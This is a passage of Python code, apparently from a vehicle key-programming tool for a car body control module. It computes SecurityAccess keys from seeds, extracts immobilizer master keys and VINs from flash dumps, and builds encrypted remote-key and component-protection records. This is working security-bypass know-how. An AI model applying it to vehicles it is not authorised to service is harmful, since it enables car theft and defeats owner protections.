    return bytes(merged)


# ────────────────────────────── SecurityAccess & CP Key Containers (00BE / 00BD) ──────────────────────────────


def bcm_compute_sa_key(seed: bytes | int) -> bytes:
    """Compute 4-byte BCM Application SecurityAccess (`27 03` -> `27 04`) key: `(seed + 0x7A73) & 0xFFFFFFFF`."""
    if isinstance(seed, (bytes, bytearray, memoryview)):
        if len(seed) != 4:
            raise ValueError(f"BCM SecurityAccess seed must be 4 bytes, got {len(seed)}")
        seed_u32 = int.from_bytes(seed, "big")
    else:
        seed_u32 = int(seed) & 0xFFFFFFFF
    return ((seed_u32 + BCM_SA_ADDEND) & 0xFFFFFFFF).to_bytes(4, "big")


def bcm_reverse8_swap(block_16b: bytes) -> bytes:
    """Apply the MPC5607B 8-byte half-reversal + swap (`block[8:16][::-1] + block[0:8][::-1]`, i.e. 16-byte reverse)."""
    if len(block_16b) != 16:
        raise ValueError(f"Block must be 16 bytes, got {len(block_16b)}")
    rev_halves = block_16b[:8][::-1] + block_16b[8:][::-1]
    return rev_halves[8:] + rev_halves[:8]


def bcm_build_cp_key_container(
    current_ika_16b: bytes,
    new_key_16b: bytes,
    key_type: int = BCM_CP_KEY_TYPE_GFA,
) -> bytes:
    """Build the 34-byte UDS `2E 00BE` (IKA, `key_type=1`) or `2E 00BD` (GFA, `key_type=2`) container encrypted under `current_ika_16b`."""
    if len(current_ika_16b) != 16:
        raise ValueError(f"Current IKA must be 16 bytes, got {len(current_ika_16b)}")
    if len(new_key_16b) != 16:
        raise ValueError(f"New key must be 16 bytes, got {len(new_key_16b)}")
    if key_type not in (BCM_CP_KEY_TYPE_IKA, BCM_CP_KEY_TYPE_GFA):
        raise ValueError(f"Key type must be 1 (IKA) or 2 (GFA), got {key_type}")
    inv_key = bytes(b ^ 0xFF for b in new_key_16b)
    c1 = bcm_reverse8_swap(bcm_aes128_ecb_encrypt(current_ika_16b, new_key_16b))
    c2 = bcm_reverse8_swap(bcm_aes128_ecb_encrypt(current_ika_16b, inv_key))
    return c1 + c2 + bytes([key_type & 0xFF, 0x00])


def bcm_unpack_cp_key_container(current_ika_16b: bytes, container_34b: bytes) -> dict[str, Any]:
    """Decrypt and verify a 34-byte `2E 00BE` / `2E 00BD` container against `current_ika_16b`."""
    if len(container_34b) != 34:
        raise ValueError(f"CP key container must be 34 bytes, got {len(container_34b)}")
    c1 = bcm_reverse8_swap(container_34b[:16])
    c2 = bcm_reverse8_swap(container_34b[16:32])
    plain1 = bcm_aes128_ecb_decrypt(current_ika_16b, c1)
    plain2 = bcm_aes128_ecb_decrypt(current_ika_16b, c2)
    valid_comp = plain2 == bytes(b ^ 0xFF for b in plain1)
    return {
        "new_key_hex": plain1.hex(),
        "complement_hex": plain2.hex(),
        "key_type": container_34b[32],
        "trailer_zero": container_34b[33] == 0,
        "valid_complement": valid_comp,
    }


# ────────────────────────────── Stock WFS Ch 3 FFB Remote Key Adaptation ──────────────────────────────


def bcm_derive_k_ffb(kc_16b: bytes) -> bytes:
    """Derive 16-byte FFB remote key encryption secret `K_ffb = AES128_ECB_ENC(K_c, C16)`."""
    if len(kc_16b) != 16:
        raise ValueError(f"Immobilizer master key K_c must be 16 bytes, got {len(kc_16b)}")
    return bcm_aes128_ecb_encrypt(kc_16b, BCM_FFB_C16)


def bcm_build_wfs_80_01(gfa_working_16b: bytes, k_ffb_16b: bytes) -> bytes:
    """Build 18-byte WFS Channel 3 `80 01` PDU: `80 01 || AES128_ECB_ENC(GFA, K_ffb)`."""
    if len(gfa_working_16b) != 16:
        raise ValueError(f"Working GFA must be 16 bytes, got {len(gfa_working_16b)}")
    if len(k_ffb_16b) != 16:
        raise ValueError(f"K_ffb must be 16 bytes, got {len(k_ffb_16b)}")
    return b"\x80\x01" + bcm_aes128_ecb_encrypt(gfa_working_16b, k_ffb_16b)


def bcm_build_ffb_key_plaintext(
    serial_id: int | bytes,
    *,
    rolling_counter: int = 0,
    freq_code: int = 0x03,
    flags: bytes = b"\x00\x00\x00",
) -> bytes:
    """Build 16-byte plaintext for a single FFB remote key slot (`Serial_LE[4] || Counter_LE[4] || Freq[1] || Flags[3] || CRC32_BE[4]`)."""
    if isinstance(serial_id, (bytes, bytearray, memoryview)):
        if len(serial_id) != 4:
            raise ValueError(f"FFB key serial_id bytes must be 4 bytes, got {len(serial_id)}")
        serial_le = bytes(serial_id)
    else:
        serial_le = (int(serial_id) & 0xFFFFFFFF).to_bytes(4, "little")
    counter_le = (int(rolling_counter) & 0xFFFFFFFF).to_bytes(4, "little")
    flag_bytes = bytes(flags[:3]).ljust(3, b"\x00")
    head12 = serial_le + counter_le + bytes([freq_code & 0xFF]) + flag_bytes
    crc32_be = (zlib.crc32(head12) & 0xFFFFFFFF).to_bytes(4, "big")
    return head12 + crc32_be


def bcm_parse_ffb_key_plaintext(plain_16b: bytes) -> dict[str, Any]:
    """Decode and verify a 16-byte decrypted FFB key block against BCM `FUN_000B8502` validation rules."""
    if len(plain_16b) != 16:
        raise ValueError(f"FFB key plaintext must be 16 bytes, got {len(plain_16b)}")
    serial_le = plain_16b[0:4]
    counter_le = plain_16b[4:8]
    freq_code = plain_16b[8]
    flags = plain_16b[9:12]
    crc_stored = int.from_bytes(plain_16b[12:16], "big")
    crc_calc = zlib.crc32(plain_16b[:12]) & 0xFFFFFFFF
    serial_u32 = int.from_bytes(serial_le, "little")
    counter_u32 = int.from_bytes(counter_le, "little")
    return {
        "serial_le_hex": serial_le.hex(),
        "serial_be_hex": serial_le[::-1].hex().upper(),
        "display_id": f"{serial_u32:08X}",
        "serial_u32": serial_u32,
        "rolling_counter": counter_u32,
        "counter_be_hex": counter_le[::-1].hex().upper(),
        "freq_code": freq_code,
        "freq_label": BCM_FREQUENCIES.get(freq_code, f"0x{freq_code:02X}"),
        "flags_hex": flags.hex(),
        "crc_stored": crc_stored,
        "crc_calc": crc_calc,
        "crc_ok": crc_stored == crc_calc,
    }


def bcm_encrypt_ffb_key_record(
    k_ffb_16b: bytes,
    serial_id: int | bytes,
    *,
    rolling_counter: int = 0,
    freq_code: int = 0x03,
    flags: bytes = b"\x00\x00\x00",
) -> bytes:
    """Build and encrypt a 16-byte FFB remote key block under `K_ffb`."""
    plain = bcm_build_ffb_key_plaintext(
        serial_id,
        rolling_counter=rolling_counter,
        freq_code=freq_code,
        flags=flags,
    )
    return bcm_aes128_ecb_encrypt(k_ffb_16b, plain)


def bcm_build_wfs_80_02(entries: list[tuple[int, bytes]]) -> bytes:
    """Build WFS Channel 3 `80 02` PDU from `(slot_number_1_to_7, cipher_16b)` tuples (or empty list for `80 02 00` clear)."""
    n = len(entries)
    if n == 0:
        return b"\x80\x02\x00"
    if n > 7:
        raise ValueError(f"BCM supports at most 7 FFB remote key slots, got {n}")
    out = bytearray(b"\x80\x02")
    for idx, (slot_num, cipher_16b) in enumerate(entries, start=1):
        slot = int(slot_num) & 0x0F
        if not (1 <= slot <= 7):
            slot = idx
        if len(cipher_16b) != 16:
            raise ValueError(f"FFB encrypted key block #{idx} must be 16 bytes, got {len(cipher_16b)}")
        out.append(((n & 0x0F) << 4) | slot)
        out.extend(cipher_16b)
    return bytes(out)


def bcm_extract_cluster_ffb_material(
    fpke_dflash: bytes,
    fpke_cflash: bytes | None = None,
    *,
    freq_code: int = 0x03,
) -> dict[str, Any]:
    """Extract `K_c`, `GFA (/1)`, `K_ffb`, raw `EEL 0x6A` records, and synthesized FFB records from an `FPK_E` or `V850E2 Kombi` DataFlash dump."""
    if is_kombi_dflash(fpke_dflash):
        info = analyze_kombi_dflash(normalize_kombi_dflash_input(fpke_dflash), fpke_cflash)
    else:
        info = analyze_fpke_dflash(fpke_dflash, fpke_cflash)
    items_by_id = {it.get("key_id"): it.get("hex", "") for it in info.get("items", []) if it.get("key_id")}
    kc_hex = items_by_id.get("kc", "")
    gfa_hex = items_by_id.get("cp1_bank_0", "")
    ika_fpke_hex = items_by_id.get("ika_cp3", "")

    kc_bytes = bytes.fromhex(kc_hex) if len(kc_hex) == 32 and kc_hex != "ff" * 16 else b""
    gfa_bytes = bytes.fromhex(gfa_hex) if len(gfa_hex) == 32 and gfa_hex != "ff" * 16 else b""
    k_ffb_bytes = bcm_derive_k_ffb(kc_bytes) if len(kc_bytes) == 16 else b""

    tr_info = info.get("transponder_records") or {}
    key_ids = tr_info.get("key_ids") or []
    raw_6a_entries = tr_info.get("entries") or []

    decoded_6a: list[dict[str, Any]] = []
    usable_raw_6a: list[tuple[int, bytes]] = []
    ordered_6a = sorted(
        raw_6a_entries,
        key=lambda e: (int(e.get("slot", 0)), int(e.get("key_number") or 0)),
    )
    for entry in ordered_6a:
        if not entry.get("usable"):
            continue
        raw_hex = str(entry.get("hex") or "").strip()
        if not raw_hex:
            continue
        if len(usable_raw_6a) >= 7:
            break
        orig_slot_num = int(entry.get("key_number") or (int(entry.get("slot", 0)) + 1))
        seq_slot_num = len(usable_raw_6a) + 1
        cipher = bytes.fromhex(raw_hex)
        rec_info: dict[str, Any] = {
            "slot": int(entry.get("slot", 0)),
            "orig_key_number": orig_slot_num,
            "key_number": seq_slot_num,
            "cipher_hex": cipher.hex(),
        }
        if len(k_ffb_bytes) == 16:
            plain = bcm_aes128_ecb_decrypt(k_ffb_bytes, cipher)
            parsed = bcm_parse_ffb_key_plaintext(plain)
            rec_info.update(parsed)
        decoded_6a.append(rec_info)
        usable_raw_6a.append((seq_slot_num, cipher))

    active_transponders: list[dict[str, Any]] = []
    synthesized_entries: list[tuple[int, bytes]] = []
    for kid in key_ids[:7]:
        if not kid.get("present") or not kid.get("within_learned_count"):
            continue
        raw_hex = str(kid.get("hex") or "").strip()
        if not raw_hex:
            continue
        seq_slot = len(active_transponders) + 1
        raw_id = bytes.fromhex(raw_hex)
        disp = kid.get("display_id") or f"{int.from_bytes(raw_id, 'little'):08X}"
        # Prefer rolling counter from decoded EEL 0x6A if matching serial is present
        counter = 0
        for d6a in decoded_6a:
            if d6a.get("display_id") == disp and d6a.get("crc_ok"):
                counter = int(d6a.get("rolling_counter", 0))
                break
        cipher_hex = ""
        if len(k_ffb_bytes) == 16:
            cipher = bcm_encrypt_ffb_key_record(
                k_ffb_bytes,
                raw_id,
                rolling_counter=counter,
                freq_code=freq_code,
            )
            cipher_hex = cipher.hex()
            synthesized_entries.append((seq_slot, cipher))
        active_transponders.append(
            {
                "slot_number": seq_slot,
                "serial_le_hex": raw_id.hex(),
                "display_id": disp,
                "rolling_counter": counter,
                "freq_code": freq_code,
                "cipher_hex": cipher_hex,
            }
        )

    # Check if raw EEL 0x6A entries are CRC-valid and match target freq_code
    raw_6a_matches_freq = bool(
        usable_raw_6a
        and all(d.get("crc_ok") and d.get("freq_code") == freq_code for d in decoded_6a)
    )
    recommended_entries = usable_raw_6a if raw_6a_matches_freq else synthesized_entries

    return {
        "part_number": (info.get("metadata") or {}).get("part_number", ""),
        "vin": (info.get("metadata") or {}).get("vin", ""),
        "immo_mode": (info.get("metadata") or {}).get("immo_mode"),
        "kc_hex": kc_bytes.hex(),
        "gfa_hex": gfa_bytes.hex(),
        "ika_fpke_hex": ika_fpke_hex if ika_fpke_hex != "ff" * 16 else "",
        "k_ffb_hex": k_ffb_bytes.hex(),
        "learned_keys": int(tr_info.get("learned_keys", 0)),
        "allowed_keys": int(tr_info.get("allowed_keys", 0)),
        "active_transponders": active_transponders,
        "decoded_eel_6a": decoded_6a,
        "raw_6a_matches_freq": raw_6a_matches_freq,
        "recommended_entries": [(s, c.hex()) for s, c in recommended_entries],
    }


# ────────────────────────────── BCM UDS & NvM Status Decoder ──────────────────────────────


def bcm_decode_status_dids(
    raw_dids: dict[int, bytes],
    nvm_slots: dict[int, tuple[bytes, ...]] | None = None,
    nvm_meta: dict[str, bytes] | None = None,
) -> dict[str, Any]:
    """Decode BCM Component Protection (`KS`) and FFB remote key status DIDs + optional NvM key slot reads."""
    cp_mismatch: int | None = None
    if 0x03DE in raw_dids and len(raw_dids[0x03DE]) >= 2:
        cp_mismatch = int.from_bytes(raw_dids[0x03DE][:2], "big")

    ika_virgin: bool | None = None
    if 0x0440 in raw_dids and len(raw_dids[0x0440]) >= 1:
        r0440 = raw_dids[0x0440]
        ika_virgin = bool((r0440[6] if len(r0440) >= 7 else r0440[0]) & 0x01)

    ks_subfunc_flags: int | None = None
    if 0x043F in raw_dids and len(raw_dids[0x043F]) >= 1:
        ks_subfunc_flags = raw_dids[0x043F][0]

    challenge_02e0 = raw_dids.get(0x02E0, b"").hex().upper()
    challenge_02f9_raw = raw_dids.get(0x02F9, b"")
    challenge_02f9_status = challenge_02f9_raw[0] if len(challenge_02f9_raw) >= 1 else None
    challenge_02f9 = challenge_02f9_raw[1:5].hex().upper() if len(challenge_02f9_raw) >= 5 else challenge_02f9_raw.hex().upper()

    # DID 0x0A65 (NvM 0x1C, 7 B): bits 1..2 of byte 0 encode ODIS DOP_TEXTTABLERadioFrequ2bit (0..3)
    rf_raw = raw_dids.get(0x0A65, b"")
    freq_code = ((rf_raw[0] >> 1) & 0x03) if len(rf_raw) >= 1 else 0x03
    freq_label = BCM_FREQUENCIES.get(freq_code, f"0x{freq_code:02X}")

    # DID 0x1983 (ODIS STRUC_STRUCRemotContrKey, 4 B):
    #   byte 0: key_number (0..15, 0xFF = not available / no recent press)
    #   byte 1 lo nibble: remote_control_button (0=lock, 1=unlock, 2=trunk, 3=not_actuated, 7=panic)
    #   byte 1 hi nibble: programmed_keys (0..7 = Anzahl angelernter Funkschlüssel)
    #   byte 2 hi nibble: code_in_capture_range (0=not_ok, 1=ok, 15=not_available)
    #   byte 3 lo nibble: battery_state_of_charge (0=not_ok, 1=ok, 15=not_available)
    #   byte 3 hi nibble: state_of_immobilizer (0=not_ok, 1=ok, 13=not_available)
    ffb_1983 = raw_dids.get(0x1983, b"")
    ffb_active_slot = ffb_1983[0] if len(ffb_1983) >= 1 else None
    ffb_buttons = (ffb_1983[1] & 0x0F) if len(ffb_1983) >= 2 else None
    ffb_learned_count = ((ffb_1983[1] >> 4) & 0x0F) if len(ffb_1983) >= 2 else None
    ffb_capture_range = ((ffb_1983[2] >> 4) & 0x0F) if len(ffb_1983) >= 3 else None
    ffb_battery_state = (ffb_1983[3] & 0x0F) if len(ffb_1983) >= 4 else None
    ffb_sync_state = ((ffb_1983[3] >> 4) & 0x0F) if len(ffb_1983) >= 4 else None

    ffb_24a6 = raw_dids.get(0x24A6, b"").hex().upper()

    slot_mask_learned = 0
    slot_mask_synced = 0
    if nvm_meta and "nvm_03" in nvm_meta and len(nvm_meta["nvm_03"]) >= 1:
        m03 = nvm_meta["nvm_03"]
        slot_mask_learned = m03[0]
        if len(m03) >= 4:
            slot_mask_synced = m03[3]

    slots: list[dict[str, Any]] = []
    if nvm_slots:
        for slot_idx in range(1, 8):
            entry = nvm_slots.get(slot_idx)
            if not entry:
                continue
            ser_be = entry[0]
            cnt_be = entry[1] if len(entry) >= 2 else b""
            sync_raw = entry[2] if len(entry) >= 3 else b""
            ser_u32 = int.from_bytes(ser_be[:4], "big") if len(ser_be) >= 4 else 0
            cnt_u32 = int.from_bytes(cnt_be[:4], "big") if len(cnt_be) >= 4 else 0
            sync_code = sync_raw[0] if len(sync_raw) >= 1 else None
            populated = len(ser_be) >= 4 and ser_be[:4] not in (b"\x00" * 4, b"\xff" * 4)
            bit = 1 << slot_idx
            slots.append(
                {
                    "slot": slot_idx,
                    "populated": populated,
                    "serial_be_hex": ser_be[:4].hex().upper(),
                    "display_id": f"{ser_u32:08X}" if populated else "—",
                    "rolling_counter": cnt_u32 if populated else 0,
                    "counter_hex": cnt_be[:4].hex().upper(),
                    "sync_code": sync_code,
                    "desynced": bool(populated and sync_code == 2),
                    "mask_learned": bool(slot_mask_learned & bit),
                    "mask_synced": bool(slot_mask_synced & bit) or bool(populated and sync_code == 0),
                }
            )

    return {
        "cp_mismatch_counter": cp_mismatch,
        "cp_active_fault": bool(cp_mismatch is not None and cp_mismatch >= 0x1F),
        "ika_virgin": ika_virgin,
        "ks_subfunc_flags": ks_subfunc_flags,
        "challenge_02e0": challenge_02e0,
        "challenge_02f9": challenge_02f9,
        "challenge_02f9_status": challenge_02f9_status,
        "freq_code": freq_code,
        "freq_label": freq_label,
        "rf_0a65_hex": rf_raw.hex().upper(),
        "ffb_1983_hex": ffb_1983.hex().upper(),
        "ffb_learned_count": ffb_learned_count,
        "ffb_active_slot": ffb_active_slot,
        "ffb_buttons": ffb_buttons,
        "ffb_capture_range": ffb_capture_range,
        "ffb_battery_state": ffb_battery_state,
        "ffb_sync_state": ffb_sync_state,
        "ffb_24a6_hex": ffb_24a6,
        "slot_mask_learned": slot_mask_learned,
        "slot_mask_synced": slot_mask_synced,
        "ffb_slots": slots,
    }
